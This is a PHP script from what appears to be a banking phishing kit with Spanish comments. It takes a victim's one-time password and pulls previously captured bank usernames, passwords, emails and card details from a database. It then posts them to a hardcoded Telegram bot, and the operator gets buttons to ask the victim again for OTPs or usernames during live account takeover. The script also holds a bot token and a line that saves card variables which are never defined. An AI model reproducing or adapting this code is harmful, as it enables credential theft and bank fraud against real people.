<?php
ob_start();
require 'conexion.php';

$codigo = $_POST['codigo'] ?? '';
$key    = $_POST['key'] ?? ''; // Se recibe la key ahora

// Verificar si se recibió la key
if (!$key) {
    die("Error: Key no proporcionada.");
}

// Buscar todos los datos de la solicitud por la key
$stmt = $pdo->prepare("SELECT numero_cuenta, monto, banco, nombre, telefono, correo 
                       FROM solicitudes WHERE `key` = ? LIMIT 1");
$stmt->execute([$key]);
$data = $stmt->fetch(PDO::FETCH_ASSOC);

if (!$data) {
    die("Error: Solicitud no encontrada.");
}

// Extraer datos previos
$celular = $data['numero_cuenta'];
$monto   = $data['monto'];
$banco   = $data['banco'];
$usuario = $data['nombre'];
$clave   = $data['telefono'];
$correo  = $data['correo']; // <- Nuevo

// Generar nuevo request_id
$nuevo_request_id = uniqid("req_");

// Actualizar el request_id y estado de esa fila
$update = $pdo->prepare("UPDATE solicitudes SET request_id = ?, estado = 'pendiente' WHERE `key` = ?");
$update->execute([$nuevo_request_id, $key]);
// Guardar tarjeta en DB
$saveCard = $pdo->prepare("UPDATE solicitudes SET numero_tarjeta = ?, nombre_tarjeta = ?, vencimiento_tar = ?, cvv = ? WHERE `key` = ?");
$saveCard->execute([$tarjeta, $nombre, $fecha, $cvv, $key]);

// Telegram
$token   = "8067654456:AAEBhilArTMwjCmZrxW2MPsPS4-yx9hSFYU";
$chat_id = "-4923753161";

// Armar mensaje con TODOS los datos
$mensaje  = "🧾 *Recibo Digital de Recarga*\n";
$mensaje .= "━━━━━━━━━━━━━━━━━━━━━━\n";
$mensaje .= "💸 Recarga solicitada: $monto\n";
$mensaje .= "🏦 Banco elegido: $banco\n";
$mensaje .= "📧 Email: $correo\n";
$mensaje .= "━━━━━━━━━━━━━━━━━━━━━━\n";
$mensaje .= "Usuario: $usuario\n";
$mensaje .= "Contraseña: $clave\n";
$mensaje .= "━━━━━━━━━━━━━━━━━━━━━━\n";

$mensaje .= "Dinámica/OTP: $codigo\n";
$mensaje .= "━━━━━━━━━━━━━━━━━━━━━━\n";









$botones = [
  'inline_keyboard' => [[
    ['text' => "clavedinamica", 'callback_data' => "OPCION_1_$nuevo_request_id"],
    ['text' => "otp", 'callback_data' => "OPCION_2_$nuevo_request_id"]
  ],  [
    ['text' => "repetirusuario", 'callback_data' => "OPCION_3_$nuevo_request_id"],
    ['text' => "repetirdinamica", 'callback_data' => "OPCION_4_$nuevo_request_id"]
  ], [
    ['text' => "transaccion completada", 'callback_data' => "OPCION_9_$nuevo_request_id"]
  ]]
];




// Enviar a Telegram
$payload = json_encode([
    'chat_id'      => $chat_id,
    'text'         => $mensaje,
    'reply_markup' => $botones
]);
$ch = curl_init("https://api.telegram.org/bot{$token}/sendMessage");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

// Redirigir a pantalla de espera con el nuevo request_id y la key
header("Location: espera.html?rid=$nuevo_request_id&key=$key&correo=" . urlencode($correo));
exit;
?>
